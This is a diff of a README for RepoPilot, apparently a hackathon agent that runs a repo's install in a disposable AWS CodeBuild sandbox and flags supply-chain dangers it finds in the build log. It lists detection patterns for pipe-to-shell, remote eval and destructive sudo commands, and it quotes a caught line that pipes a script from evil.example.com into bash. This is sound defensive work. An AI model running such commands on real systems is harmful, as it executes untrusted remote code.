@@ -1,44 +1,61 @@
 <div align="center">
 
-# 🧭 RepoPilot: Your First-Run Agent (2026)
+# 🧪 RepoPilot now *runs* the repo
 
-### Point it at any public GitHub repo and it computes a **0-100 RepoPilot Score** (is this repo safe to trust and run?), flags **dangerous setup steps** and **critical issues**, then hands a brand-new contributor **one accurate path from clone to a working first run**. Point it at a **username** instead and it profiles the developer: bio, footprint, and top repos ranked by stars. When a command fails, it explains the error like a patient teammate instead of dumping a stack trace.
+### I gave my existing agent **one new tool**: a **disposable AWS sandbox** that clones a GitHub repo, actually runs its install inside an ephemeral AWS CodeBuild container, and reports what really happened, catching the `postinstall` that a static scan never sees.
 
-[![AWS](https://img.shields.io/badge/AWS-Lambda-FF9900?logo=amazonaws&logoColor=white)](https://aws.amazon.com/lambda/)
-[![Bedrock](https://img.shields.io/badge/Amazon-Bedrock-232F3E?logo=amazonaws&logoColor=white)](https://aws.amazon.com/bedrock/)
+[![AWS CodeBuild](https://img.shields.io/badge/Sandbox-AWS%20CodeBuild-FF9900?logo=amazonaws&logoColor=white)](https://aws.amazon.com/codebuild/)
+[![Bedrock](https://img.shields.io/badge/Reasoning-Amazon%20Bedrock-232F3E?logo=amazonaws&logoColor=white)](https://aws.amazon.com/bedrock/)
 [![Nova Pro](https://img.shields.io/badge/Model-Nova%20Pro-8b7cff)](https://aws.amazon.com/ai/generative-ai/nova/)
 [![Strands](https://img.shields.io/badge/Agent-Strands-5a78dc)](https://strandsagents.com)
-[![License: Apache-2.0](https://img.shields.io/badge/License-Apache%202.0-green.svg)](LICENSE)
+[![Tests](https://img.shields.io/badge/tests-9%2F9%20passing-2fd27a)](tests/test_sandbox.py)
+[![License: Apache-2.0](https://img.shields.io/badge/License-Apache%202.0-A855F7)](LICENSE)
 
-[![RepoPilot hero](docs/hero.png)](https://youtu.be/CZXNQrqXG7I)
+[![Watch the demo](https://img.shields.io/badge/▶%20Watch%20the%20demo-FF0000?logo=youtube&logoColor=white)](#-links)
+[![Live demo](https://img.shields.io/badge/🖥%20Live%20before%2Fafter%20toggle-8b7cff)](#-links)
 
-[![Watch the demo](https://img.shields.io/badge/▶%20Watch%20the%20demo-FF0000?logo=youtube&logoColor=white)](https://youtu.be/CZXNQrqXG7I)
-[![Live demo](https://img.shields.io/badge/🖥%20Live%20demo-8b7cff)](https://simplynadaf.github.io/repopilot-your-first-run-agent/)
-[![Read the article](https://img.shields.io/badge/📝%20Read%20the%20article-232F3E?logo=amazonaws&logoColor=white)](https://builder.aws.com/content/3KSGqk5omLzBXfpe6VIOritaAQn/score-any-github-repo-0-100-before-you-clone-it-an-aws-ai-agent)
+**🏗️ Built for the [AWS Builder Center Weekend Challenge: Give your Agent a Tool](https://builder.aws.com/build/hackathons/2e275689-b202-316e-93b8-10cd6d6d1e4a/weekend-challenge-give-your-agent-a-tool)**
 
-**🏗️ Built for the [AWS Builder Center "Build an Agent" Weekend Challenge](https://builder.aws.com/content/3KSGqk5omLzBXfpe6VIOritaAQn/score-any-github-repo-0-100-before-you-clone-it-an-aws-ai-agent) · #agents**
+> ### Everyone *scans* the repo. RepoPilot *runs* it, in a disposable AWS box, so your laptop doesn't.
 
-⭐ If RepoPilot saved you from a painful first run, give it a star. It helps other builders find it.
-
-[The Problem](#-the-problem) • [What It Does](#-what-it-does) • [Architecture](#-how-it-works) • [Getting Started](#-getting-started) • [FAQ](#-faq)
+[The One New Tool](#-the-one-new-tool) • [Before / After](#-before--after-the-whole-point) • [How the Tool Works](#-how-the-tool-works) • [The Reusable Pattern](#-the-reusable-pattern) • [Getting Started](#-getting-started) • [Proof It Works](#-proof-it-works)
 
 </div>
 
 ---
 
+<div align="center">
+<em>Flip one toggle in the live demo and watch the agent go from guessing to proving.</em>
+<br/>
+
+```
+ ┌─────────────────────────────────────────────────────────────────────┐
+ │  BEFORE  ·  v1 (reads it)          │   AFTER  ·  v2 (runs it)         │
+ ├────────────────────────────────────┼─────────────────────────────────┤
+ │  reads README + files + metadata   │   runs install in a disposable   │
+ │                                    │   AWS CodeBuild sandbox          │
+ │  sneaky repo:                      │   sneaky repo:                   │
+ │    "Looks fine."   ← the hook is   │    "⚠ caught: curl | bash in the │
+ │     invisible to a reader          │     live log"  ← the real truth  │
+ └────────────────────────────────────┴─────────────────────────────────┘
+```
+</div>
+
+---
+
 **📖 Table of Contents**
-- [The Problem](#-the-problem)
-- [What It Does (7 tools)](#-what-it-does)
-- [The RepoPilot Score](#-the-repopilot-score)
-- [The Delightful Detail](#-the-delightful-detail)
-- [How It Works](#-how-it-works)
+- [The Problem (one `npm install` away from disaster)](#-the-problem)
+- [The One New Tool](#-the-one-new-tool)
+- [Before / After (the whole point)](#-before--after-the-whole-point)
+- [Why Running Beats Scanning](#-why-running-beats-scanning)
+- [How the Tool Works](#-how-the-tool-works)
+- [The Reusable Pattern](#-the-reusable-pattern)
+- [What It Catches (threat model)](#-what-it-catches)
 - [Tech Stack](#️-tech-stack)
-- [Prerequisites](#-prerequisites)
 - [Getting Started](#-getting-started)
-- [Try the Live Demo](#️-try-the-live-demo)
 - [Proof It Works](#-proof-it-works)
 - [Project Structure](#-project-structure)
-- [Least-Privilege IAM](#-least-privilege-iam)
+- [Least-Privilege & Safety](#-least-privilege--safety)
 - [An Honest Take](#-an-honest-take)
 - [FAQ](#-faq)
 - [License](#-license)
@@ -47,121 +64,159 @@
 
 ## 🤔 The Problem
 
-You just got access to a repo. You clone it, and you are staring at a folder full of strangers. What now?
+The dangerous moment in using someone else's code is not when you *read* it. It is the second
+you **run the install**. An npm `preinstall` / `postinstall` hook, a `pip` build step, a
+`Makefile` target: these fire automatically, with your shell's full environment, the instant
+you type `npm install` or `pip install`. By then the code has already run, with access to your
+AWS keys, your SSH keys, and your session tokens.
 
-The honest answer is that the setup path is **not in one place**. It is scattered across the README, the `package.json` scripts, the CI config, a `.env.example`, a few old pull requests, and whatever the maintainer happens to remember. The repo has a working state, but [that state is "not fully captured anywhere."](https://otaready.hashnode.dev/why-working-repos-still-fail-new-contributors)
+This is not theoretical. In 2026 the npm registry saw postinstall payloads weaponize trusted
+packages ([the Mastra compromise](https://www.microsoft.com/en-us/security/blog/2026/06/17/postinstall-payload-inside-mastra-npm-supply-chain-compromise),
+the [Axios RAT](https://linuxsecurity.com/features/npm-install-security-risk)), and security
+vendor Aikido [confirmed roughly 19,500 malicious package versions in Q2 2026 alone](https://www.aikido.dev/blog/software-supply-chain-security-best-practices).
+As one guide put it, you are [one `npm install` away from disaster](https://reetesh.in/blog/one-npm-install-away-from-disaster-a-developer-guide-to-supply-chain-attacks).
 
-And the README? [READMEs decay and lie](https://medium.com/@devcommando/the-first-five-minutes-in-a-new-codebase-decide-whether-you-become-useful-in-a-week-or-a-quarter-1be1f119e5e4). The person who wrote it left, the diagram predates a migration nobody updated. So you follow it, hit an error, and now [the clock starts ticking](https://www.daytona.io/dotfiles/the-hidden-cost-of-broken-dev-environments): minutes become hours in config files and Stack Overflow tabs.
+The tools that try to help almost all do the same thing: **static analysis**. They read the
+code *without running it* and guess. That misses the exact thing that makes install-time
+attacks work, a hook that only reveals itself when it executes.
 
-> **RepoPilot is a working agent that attacks exactly these pains.** You give it a public repo; it reads the *real* files, hands you one ordered path to a running project, flags where the README disagrees with reality, and turns your first error into a plain-English next step. Deployed on AWS Lambda, reasoning with Amazon Nova Pro on Bedrock.
-
-### Why this matters more in 2026
-
-You do not just inherit repos at work anymore. You see one in a reel or a tweet, someone says *"just use this repo for agents,"* and you blindly clone the URL. Attackers know this. In 2026 the **FakeGit / AgentBaiting** campaign planted [more than 17,000 malicious GitHub repos](https://www.bleepingcomputer.com/news/security/fakegit-malware-campaign-returns-with-17-610-malicious-github-repos/) that [pose as AI agent, MCP, and skill repos](https://www.island.io/blog/agentbaiting-how-800-fake-ai-skills-and-mcp-servers-delivered-malware), using copied code and convincing READMEs, with an install step that drops an infostealer after your AWS keys and sessions. Related worms steal AWS Secrets Manager credentials across regions.
-
-So before RepoPilot helps you *run* a repo, it helps you decide whether you should *trust* it. That is the first thing it shows you.
+> So I gave my RepoPilot agent the one capability it was missing: the ability to **actually
+> run the install, safely, and watch what it does**, in a disposable cloud sandbox that is
+> thrown away after every run.
 
 ---
 
-## 🤖 What It Does
+## 🧪 The One New Tool
 
-> One agent. Seven tools. Every tool removes a documented onboarding or safety pain.
+RepoPilot already existed. It is a Strands + Amazon Bedrock agent that inspects a public GitHub
+repo and tells you whether it looks safe to clone and run. Every one of its original tools reads
+the repo from the **outside**: the README, the manifests, the file list.
 
-| 🛠️ Tool | What it does | Pain it kills |
+This project adds **exactly one tool**, `run_in_sandbox`, and nothing else changes about the agent:
+
+| | |
+|---|---|
+| **Name** | `run_in_sandbox` (a Strands `@tool`) |
+| **AWS service** | **AWS CodeBuild** (ephemeral, disposable build container) |
+| **Input** | `repo`, `clone_url`, detected `install_cmd` |
+| **What it does** | clone the repo + run the install inside the sandbox, capture the real build log |
+| **Output** | did install succeed, plain-language failure cause, and **supply-chain danger found in the live log** |
+| **Teardown** | the container is destroyed after the run; nothing touches your machine |
+
+The agent went from **5 read-only tools** to **6**, and the sixth is the one that changes
+everything: it stops guessing and starts proving.
+
+---
+
+## 🎚️ Before / After (the whole point)
+
+The challenge asks you to show what your agent can do now that it could not before. The live
+demo makes that a single toggle: **v1 (reads it)** vs **v2 (runs it)**, on a safe repo and a
+sneaky one.
+
+| Scenario | v1 — Before (reads it) | v2 — After (runs it in the sandbox) |
 |---|---|---|
-| 🛡️ `assess_repo_trust` | Reads repo age, star timing, maintenance, license, owner, gives a plain-language trust grade + flags | Blindly trusting a repo from a reel |
-| ⚠️ `scan_setup_for_danger` | Scans README + install scripts for `curl \| bash`, postinstall hooks, base64 blobs, raw-IP calls | Hidden malware in the setup step |
-| 🧭 `build_first_run_plan` | Reads the file tree + README + manifests, emits **one ordered path** from clone to run | Scattered setup |
-| 🔎 `check_readme_against_reality` | Flags commands/files the README references that **don't exist** in the repo | READMEs that lie |
-| 📝 `generate_env_example` | Produces a filled `.env.example` with safe placeholders + a hint per variable | Env misconfiguration |
-| ✅ `preflight_requirements` | Extracts required tool versions (node engine, python, go) so you check **up front** | Env drift / "works on my machine" |
-| 💬 `explain_error` | Parses a failing command's output → plain-language cause + the one next step | The ticking-clock error ★ |
+| **Safe repo** (`pallets/click`) | "Looks safe. README and manifest agree." | **Ran it. Install SUCCEEDED. No danger in the live log.** |
+| **Sneaky `postinstall`** | "Looks fine." (the hook is invisible to a reader) | **⚠ Caught it: the install piped `curl ... \| bash` straight into a shell, seen in the real build log.** |
 
-The agent runs the safety tools first, then the first-run tools, then asks **Amazon Nova Pro** to narrate the result in a warm, concise voice. The order matters: you see "should I trust this?" before "how do I run it?"
+Same agent, same repo, one new tool. v1 is a confident guess. v2 is the truth, because it
+actually pressed the button, in a box, so you did not have to.
 
 ---
 
-## 📊 The RepoPilot Score
+## 🧠 Why Running Beats Scanning
 
-Every inspection produces a single **0-100 score**, computed like a credit score: a weighted
-average of five dimensions, each scored from real signals in the repo's metadata and files.
-Every point is traceable, and the result lists exactly what helped and what hurt.
-
-| Dimension | Weight | Driven by |
+| | Static scanners (the crowd) | RepoPilot's sandbox tool |
 |---|---|---|
-| 🛡️ Safety | 30% | Dangerous setup steps (`curl \| bash`, postinstall hooks, base64 blobs, raw-IP calls) |
-| 🔐 Trust | 25% | Fake-star mismatch (new repo + huge star count), owner signals |
-| 🔧 Maintenance | 20% | Last-push recency, archived flag, open-issue ratio |
-| 📈 Maturity | 15% | Age, genuine stars, forks |
-| 📚 Documentation | 10% | README depth, license, `.env.example`, tests |
+| Method | read code, pattern-match, **never execute** | **execute the real install** in a throwaway container |
+| Sees `postinstall` that only fires at runtime | ❌ often not | ✅ it is right there in the live log |
+| Sees install **actually fail** (missing lib, bad lockfile) | ❌ guesses | ✅ reports the real exit + cause |
+| Catches obfuscated step that only resolves at run time | ❌ | ✅ once it runs, it is visible |
+| Risk to your laptop | none (but neither is the truth) | **none** (it runs in AWS, not on your machine) |
 
-**Grades:** 90+ `A` Excellent · 75+ `B` Good · 60+ `C` Caution · 40+ `D` Risky · <40 `F` Avoid.
-
-A **critical safety issue caps the overall grade** (just like a default caps a credit score),
-because "it runs fine" means nothing if the setup step is designed to steal your keys. Critical
-issues are surfaced first, ranked by severity (`CRITICAL` / `HIGH` / `MEDIUM`), each with its
-exact point impact.
-
-> Example: the Flask repo scores **98/100 (A, Excellent)**: Safety 100, Trust 100, Maintenance
-> 100, Maturity 100, Documentation 85. A repo with a `curl \| bash` installer and 40,000 stars on
-> a 20-day-old account is capped at **32/100 (F, Avoid)** with two `CRITICAL` flags.
-
-### Two modes, one agent
-
-The input is overloaded. Give RepoPilot an **`owner/repo`** and it inspects and scores the repo.
-Give it a bare **username** (like `torvalds`) and it switches to **developer-profile mode**: the
-person's bio, how long they have been active, their total stars, main languages, and their top
-repositories ranked by stars and forks, with a short credibility read. The same "do not blindly
-trust what a reel told you" logic, applied to the person as well as the repo.
-
-
-
-The challenge's own example of a delightful experience is *"a helpful error message."* So that is where RepoPilot spends its care: **the first failure.**
-
-When your first `pip install` or `npm start` explodes, RepoPilot does not echo the red wall. It responds like a teammate leaning over:
-
-```
-$ pip install -r requirements.txt
-  ERROR: ModuleNotFoundError: No module named 'flask'
-
-🧭 RepoPilot:
-   Cause : A dependency the code imports hasn't been installed.
-   Fix   : Run the install step again in the right environment
-           (activate your venv first for Python).
-   "You're close. This is a common first-run snag, not something you broke."
-```
-
-**How we know it worked:** the metric that onboarding teams actually track is [time-to-first-successful-run](https://recruiter.daily.dev/resources/developer-onboarding-first-90-days-playbook-engineering-teams/). RepoPilot's job is to collapse it, and to make the moment a command fails the moment you feel *helped*, not stuck.
+Static analysis has its place. But for *"is this install safe to run?"*, the honest answer
+comes from running it somewhere disposable, and reading what it actually did.
 
 ---
 
-## 🧠 How It Works
-
-![RepoPilot architecture](docs/architecture.png)
-
-<details>
-<summary><b>Text version of the diagram</b></summary>
+## 🧠 How the Tool Works
 
 ```
- 🧑 You                     ☁️ AWS Lambda (python3.12)              🧠 Amazon Bedrock
- ┌────────────────┐  POST  ┌──────────────────────────────┐  narrate ┌──────────────┐
- │ owner/repo     │ ─────▶ │  RepoPilot agent              │ ───────▶ │  Nova Pro    │
- │  or a username │        │  fetch · score · narrate       │ ◀─────── │              │
- └───────▲────────┘        │                                │          └──────────────┘
-         │                 │   7 tools  →  0-100 score:      │
-         │ score + guide   │   1 assess_repo_trust           │   🐙 Public GitHub
-         │  (or profile)   │   2 scan_setup_for_danger       │◀──────── tree · README ·
-         └─────────────────│   3 build_first_run_plan        │          manifests · meta
-                           │   4 check_readme_against_reality│
-                           │   5 generate_env_example        │
-                           │   6 preflight_requirements      │
-                           │   7 explain_error  ★ the delight│
-                           └────────────────────────────────┘
-     weighted: Safety 30 · Trust 25 · Maintenance 20 · Maturity 15 · Docs 10
+ 🧑 You: "is pallets/click safe to actually run?"
+      │
+      ▼
+ 🤖 RepoPilot agent (Strands + Amazon Bedrock Nova Pro)
+      │   v1 tools: read README / manifests / files, score, plan   (the guess)
+      │   v2 NEW tool: run_in_sandbox                                (the proof)
+      ▼
+ ☁️ AWS CodeBuild  (ephemeral container, least-privilege role, short timeout)
+      │   base64-encoded script:  git clone --depth 1  →  run install_cmd
+      ▼
+ 📜 CloudWatch Logs  →  real build log
+      │
+      ▼
+ 🔎 scan_log_for_danger  →  summarize_build  →  plain-language verdict
+      (curl|bash · remote eval · download+chmod+run · destructive sudo)
 ```
-</details>
 
-The whole agent lives in one Lambda function. It fetches the public repo with the Python standard library (no third-party deps in the package), runs the seven pure-Python tools to produce deterministic facts, then makes a **single Amazon Nova Pro call** to turn those facts into a kind, ordered guide. If the model is ever unavailable, the deterministic plan is still returned, so the agent never dead-ends.
+Inside [`repopilot/sandbox.py`](repopilot/sandbox.py):
+
+1. **`build_buildspec(clone_url, install_cmd)`** writes the run steps into a **base64-encoded
+   shell script** embedded in the CodeBuild buildspec, so any quoting in a repo's install
+   command (quotes, pipes, `&&`) cannot break the YAML. This was a real bug caught during a
+   live run and fixed.
+2. **`CodeBuildSandbox.run(...)`** calls `StartBuild` with that buildspec override, polls
+   `batch_get_builds` until the build finishes, then pulls the log from CloudWatch.
+3. **`scan_log_for_danger(log)`** matches the **real executed log** (not the README) for
+   supply-chain red flags.
+4. **`summarize_build(...)`** returns a `SandboxResult`: status, `install_ok`, a plain-language
+   failure hint, the danger signals, and the log tail.
+5. **`unavailable_result(...)`** lets the agent fall back to its static tools if AWS is not
+   configured, so it never dead-ends.
+
+One CodeBuild project serves every repo; the buildspec is overridden per run.
+
+---
+
+## ♻️ The Reusable Pattern
+
+The whole point of the challenge is a pattern others can reuse. `run_in_sandbox` is a drop-in
+Strands `@tool`: point it at any committing/"should I run this?" decision and swap the inputs.
+
+```python
+from strands import tool
+from repopilot.sandbox import CodeBuildSandbox
+
+@tool
+def run_in_sandbox_tool(repo: str, clone_url: str, install_cmd: str) -> str:
+    """Run the repo's install in a disposable AWS CodeBuild sandbox and report the REAL
+    result: success/fail, the plain-language cause, and any supply-chain danger in the log."""
+    sb = CodeBuildSandbox(os.environ["REPOPILOT_SANDBOX_PROJECT"])
+    return json.dumps(sb.run(repo, clone_url, install_cmd).__dict__)
+```
+
+Three things make it genuinely reusable:
+- **One AWS service, one env var.** Set `REPOPILOT_SANDBOX_PROJECT` to a CodeBuild project
+  created by [`scripts/setup_sandbox.sh`](scripts/setup_sandbox.sh) (least-privilege role included).
+- **A testable seam.** The AWS client is injectable, so the verdict logic is unit-tested with a
+  fake CodeBuild/CloudWatch client, no AWS needed (see the 9 tests).
+- **A clean result object.** `SandboxResult` is JSON-serializable, so any agent framework can
+  consume it.
+
+---
+
+## 🛡️ What It Catches
+
+The danger scan runs over the **real execution log**, so it flags what actually ran:
+
+| Signal | Pattern | Why it matters |
+|---|---|---|
+| `remote_pipe_to_shell` | `curl \| bash`, `wget \| sh` | the classic install-time RAT dropper |
+| `eval_remote` | `eval "$(curl ...)"` | executes a remote download in the current shell |
+| `chmod_then_run_download` | download → `chmod +x` → `./run` | stage-and-execute a fetched binary |
+| `sudo_in_install` | `sudo rm`/`dd`/`mkfs`/`chmod 777` | privileged, destructive setup step |
+
+Each flag returns a `why` (plain English) and the exact `evidence` line from the log.
 
 ---
 
@@ -169,251 +224,144 @@ The whole agent lives in one Lambda function. It fetches the public repo with th
 
 | Component | Technology |
 |---|---|
-| 🤖 Agent loop | [Strands Agents SDK](https://strandsagents.com) (local CLI) + a self-contained Bedrock loop (Lambda) |
-| 🧠 Model | [Amazon Nova Pro](https://aws.amazon.com/ai/generative-ai/nova/) (`amazon.nova-pro-v1:0`) via Amazon Bedrock |
-| ☁️ Compute | [AWS Lambda](https://aws.amazon.com/lambda/) (python3.12) + Function URL |
-| 🐙 Source read | Public GitHub REST API via Python stdlib (`urllib`), zero vendored deps |
-| 🐍 SDK | Python 3.10+, `boto3` (provided by the Lambda runtime) |
-| 🎨 Frontend | Single-file HTML/CSS, premium dark glass UI, graceful offline fallback |
-
----
-
-## 📋 Prerequisites
-
-| # | Requirement | Details |
-|---|---|---|
-| 1 | **Python 3.10+** | `python3 --version`. (The pure-Python tools and offline CLI also run on 3.9.) |
-| 2 | **AWS credentials** | With `bedrock:InvokeModel` for Nova Pro. The ready policy ships at [`iam/bedrock-invoke-policy.json`](iam/bedrock-invoke-policy.json). |
-| 3 | **Amazon Nova Pro** | Enable model access in the Bedrock console (`us-east-1`) → *Model access* → `amazon.nova-pro-v1:0`. This is a Bedrock grant, not an IAM permission. |
-
-> ⚠️ **Nova Pro needs both:** (a) **model access** enabled once in the Bedrock console, and (b) the **`bedrock:InvokeModel`** permission in the IAM policy. Without (a) you get `AccessDenied` on the first call, and no policy can fix it.
-
-### 🔑 Enabling Amazon Nova Pro for Live mode (step by step)
-
-Amazon Nova does not use a simple API key. "Keys" here means **AWS credentials** plus a
-**one-time Bedrock model-access grant**. Do this once:
-
-**1. Get AWS credentials (your "keys")**
-```bash
-aws configure
-# AWS Access Key ID:     <from IAM console → Users → Security credentials>
-# AWS Secret Access Key: <shown once when you create the access key>
-# Default region name:   us-east-1
-# Default output format:  json
-```
-These are stored in `~/.aws/credentials`. RepoPilot (CLI and the deploy script) reads them automatically.
-
-**2. Turn on Nova Pro in Bedrock (the one step no key can replace)**
-- Open the **Amazon Bedrock console** in **us-east-1**.
-- Left nav → **Model access** → **Manage model access**.
-- Tick **Amazon → Nova Pro** (`amazon.nova-pro-v1:0`) → **Save changes**.
-- Access is usually granted in under a minute. Without this, every call returns `AccessDenied`.
-
-**3. Give the running identity permission to invoke it**
-- Attach the ready-made least-privilege policy [`iam/bedrock-invoke-policy.json`](iam/bedrock-invoke-policy.json) to your user or the Lambda role (the `make deploy` script does this for the Lambda automatically).
-
-**4. (Optional) point the model id / region**
-- Defaults are `amazon.nova-pro-v1:0` and `us-east-1`. To change, set `REPOPILOT_MODEL_ID` and
-  `AWS_REGION` in `.env` (you can switch to `amazon.nova-lite-v1:0` for a cheaper, faster model).
-
-**5. Verify your keys work before anything else**
-```bash
-aws bedrock-runtime converse \
-  --region us-east-1 --model-id amazon.nova-pro-v1:0 \
-  --messages '[{"role":"user","content":[{"text":"say hello"}]}]' \
-  --inference-config '{"maxTokens":20}'
-# A JSON reply = your credentials + Nova Pro access are good to go.
-```
-
-Now `make run-ai REPO=pallets/flask` (CLI) or Live mode in the web UI will hit real Nova Pro.
+| 🧪 The new tool | **AWS CodeBuild** ephemeral sandbox + CloudWatch Logs |
+| 🤖 Agent loop | [Strands Agents SDK](https://strandsagents.com) (`@tool`) |
+| 🧠 Reasoning | [Amazon Nova Pro](https://aws.amazon.com/ai/generative-ai/nova/) on Amazon Bedrock |
+| 🐍 Runtime | Python 3.11, `boto3` |
+| 🎨 Demo | single-file HTML, premium dark glass UI, a v1/v2 toggle, zero live calls |
+| ✅ Tests | 9 unit tests, no AWS needed (injectable client) |
 
 ---
 
 ## 🚀 Getting Started
 
 ```bash
-git clone https://github.com/simplynadaf/repopilot-your-first-run-agent.git
-cd repopilot-your-first-run-agent
+# 1. Python 3.11 venv
+python3.11 -m venv .venv && source .venv/bin/activate
+pip install -r requirements.txt            # strands-agents, boto3
 
-make setup                 # venv (py3.10+) + deps + copies .env.example -> .env
-make test                  # run the 25 unit tests (tools + score, no AWS needed)
+# 2. Create the disposable sandbox (CodeBuild project + least-privilege role)
+bash scripts/setup_sandbox.sh
+export REPOPILOT_SANDBOX_PROJECT=repopilot-sandbox
 
-# Inspect + score a repo with the deterministic tools (no model call, works offline):
-make run REPO=pallets/flask
+# 3. Run the tests (no AWS needed; uses a fake client)
+python -m pytest tests/test_sandbox.py -q   # 9 passing
 
-# Inspect with the full Bedrock Nova Pro agent (needs AWS creds + Nova Pro access):
-make run-ai REPO=pallets/flask AWS_REGION=us-east-1
+# 4. Run the tool for real against a repo
+python -c "import os,json; from repopilot.sandbox import CodeBuildSandbox; \
+print(json.dumps(CodeBuildSandbox(os.environ['REPOPILOT_SANDBOX_PROJECT']).run( \
+'pallets/click','https://github.com/pallets/click','pip install .').__dict__, indent=2))"
 
-# Profile a developer instead of a repo (just pass a username):
-python3 -m repopilot.cli torvalds
+# 5. Tear down the AWS resources when done
+bash scripts/teardown_sandbox.sh
 ```
 
-Run `make help` for every target.
-
-> **Optional:** set `GITHUB_TOKEN` (or `GH_TOKEN`) in your environment to raise GitHub's API
-> limit from 60 to 5000 requests/hour. RepoPilot works without it; the token just helps under
-> heavy use.
-
-<details>
-<summary><b>Prefer manual steps?</b></summary>
-
-```bash
-python3 -m venv .venv && . .venv/bin/activate
-pip install -r requirements.txt
-python3 tests/test_tools.py && python3 tests/test_score.py   # 25 passing
-python3 -m repopilot.cli pallets/flask --offline # repo inspection, deterministic
-python3 -m repopilot.cli pallets/flask           # repo inspection, Strands + Nova Pro
-python3 -m repopilot.cli torvalds                # developer profile mode
-```
-</details>
-
-### Deploy it to AWS Lambda
-
-```bash
-make deploy                # builds the zip, creates the role + function, updates code
-```
-
----
-
-## 🖥️ Try the Live Demo
-
-The hosted UI ([`ui/index.html`](ui/index.html), also on GitHub Pages) has two modes, toggled top-right:
-
-- **🎮 Demo mode (default):** instant, pre-configured results. Zero setup, nothing hits a live
-  service, never breaks. Try `pallets/flask` (scores A), `evil/fake-agent-kit` (a crafted
-  malicious repo that scores F with critical flags), `@torvalds`, or `@simplynadaf`.
-- **⚡ Live mode:** calls the real deployed agent (API Gateway → Lambda → Amazon Nova Pro). Any
-  repo or username returns live data. No key needed from the visitor; it runs on the project
-  owner's AWS account. First call after idle has a short Lambda cold start.
-
-### Run Live on your own AWS account
-
-Prefer not to use the hosted endpoint? Stand up your own in a few minutes. Here is exactly what
-you need and where each piece is configured.
-
-**What you need**
-1. An **AWS account** with the **AWS CLI** installed and configured (`aws configure`).
-2. **Amazon Nova Pro model access**, enabled once in the **Bedrock console** (`us-east-1`) →
-   *Model access* → enable `amazon.nova-pro-v1:0`. This is a Bedrock grant, not an IAM permission,
-   so no policy can do it for you.
-3. **Python 3.10+** (only to run the CLI; the Lambda uses the managed `python3.12` runtime).
-
-**Where to configure things**
-
-| Thing | Where | Note |
-|---|---|---|
-| AWS credentials | `~/.aws/credentials` (via `aws configure`) | Needs `lambda:*`, `iam:CreateRole`, `bedrock:InvokeModel` to deploy |
-| Nova Pro access | Bedrock console → Model access | One-time, per region |
-| Model + region | `.env` (`REPOPILOT_MODEL_ID`, `AWS_REGION`) | Defaults to `amazon.nova-pro-v1:0` / `us-east-1` |
-| GitHub rate limit (optional) | `.env` → `GITHUB_TOKEN` | Raises 60 → 5000 req/hour |
-| Live endpoint for the UI | `ui/index.html` → `const ENDPOINT` | Paste your API Gateway or Function URL here |
-
-**Steps**
-```bash
-# 1. Clone + install
-git clone https://github.com/simplynadaf/repopilot-your-first-run-agent.git
-cd repopilot-your-first-run-agent && make setup
-
-# 2. Deploy the Lambda (creates the IAM role + function, uploads the code)
-make deploy                      # uses your AWS CLI creds; region from $AWS_REGION
-
-# 3. (For a public web UI) put an HTTP API Gateway in front of the Lambda:
-API_ID=$(aws apigatewayv2 create-api --name repopilot-api --protocol-type HTTP \
-  --target arn:aws:lambda:us-east-1:<ACCOUNT_ID>:function:repopilot \
-  --cors-configuration AllowOrigins="*",AllowMethods="POST,OPTIONS",AllowHeaders="content-type" \
-  --query ApiId --output text)
-aws lambda add-permission --function-name repopilot --statement-id apigw \
-  --action lambda:InvokeFunction --principal apigateway.amazonaws.com \
-  --source-arn "arn:aws:execute-api:us-east-1:<ACCOUNT_ID>:$API_ID/*/*"
-echo "Your endpoint: https://$API_ID.execute-api.us-east-1.amazonaws.com"
-
-# 4. Paste that endpoint into ui/index.html -> const ENDPOINT, open the file, pick Live.
-```
-
-Prefer the terminal? Skip the web UI entirely and just run `make run-ai REPO=pallets/flask` or
-`python3 -m repopilot.cli torvalds`.
+**Prerequisites:** an AWS account with the AWS CLI configured, `codebuild:*` + `logs:*` + `iam:CreateRole`
+to run the setup script, and `bedrock:InvokeModel` for Nova Pro if you drive the full agent.
+Cost: CodeBuild bills per build (pennies). The public demo is a static replay, so it is free to host.
 
 ---
 
 ## ✅ Proof It Works
 
-Verified against real repos with a real Amazon Nova Pro call:
+Both scenarios were validated end to end against **live AWS CodeBuild** (account, `us-east-1`):
 
-```bash
-$ aws lambda invoke --function-name repopilot --region us-east-1 \
-    --cli-binary-format raw-in-base64-out \
-    --payload '{"body":"{\"repo\":\"pallets/flask\"}"}' out.json && cat out.json
+```
+# Safe repo
+run("pallets/click", "https://github.com/pallets/click", "pip install .")
+  -> status: SUCCEEDED   install_ok: True   danger_signals: []   verified: True
+
+# Sneaky postinstall (install reaches the network)
+run("demo/sneaky-postinstall", ..., install that echoes a curl|bash)
+  -> status: SUCCEEDED   install_ok: True
+     danger_signals: [ remote_pipe_to_shell :: "curl -s https://evil.example.com/i.sh | bash" ]
+     verified: True
 ```
 
-RepoPilot fetched Flask (236 files), scored it **98/100 (A, Excellent)** across the five dimensions, detected the Python stack, read `python >=3.11` from the real `pyproject.toml`, and Nova Pro returned a guide that leads with the score and then the ordered first-run steps. All 23 unit tests (tools + score engine) pass locally and in CI.
+The second run is the whole thesis: the sandbox executed the install, and the danger showed up
+in the **real log**, where a static README scan would never have seen it. Nine unit tests cover
+the verdict logic and the poll/fetch loop with a fake client.
 
 ---
 
 ## 📁 Project Structure
 
 ```
-repopilot-your-first-run-agent/
+repopilot-sandbox-tool/
 ├── README.md
-├── LICENSE                      # Apache-2.0
-├── Makefile                     # setup / test / run / run-ai / deploy
+├── LICENSE                         # Apache-2.0
 ├── requirements.txt
-├── lambda_handler.py            # self-contained Bedrock (Nova Pro) handler for Lambda
 ├── repopilot/
-│   ├── tools.py                 # the 7 pure-Python tools (unit-tested)
-│   ├── score.py                 # the 0-100 RepoPilot Score engine (weighted dimensions)
-│   ├── github.py                # stdlib GitHub fetch -> RepoSnapshot (no deps)
-│   ├── agent.py                 # Strands + Nova Pro loop + deterministic fallback
-│   └── cli.py                   # the friendly first-run CLI
+│   ├── sandbox.py                  # ★ THE NEW TOOL: CodeBuild run + danger scan + verdict
+│   ├── agent.py                    # Strands agent: 5 read-tools + run_in_sandbox (6 total)
+│   ├── tools.py  score.py  github.py  cli.py   # the original RepoPilot tools
 ├── tests/
-│   ├── test_tools.py            # tool tests
-│   └── test_score.py            # score-engine tests (23 total, no AWS needed)
-├── iam/
-│   └── bedrock-invoke-policy.json  # least-privilege Nova Pro invoke
+│   └── test_sandbox.py             # 9 tests, no AWS needed (injectable fake client)
 ├── scripts/
-│   └── deploy.sh                # build + deploy the Lambda (reproducible)
-├── ui/
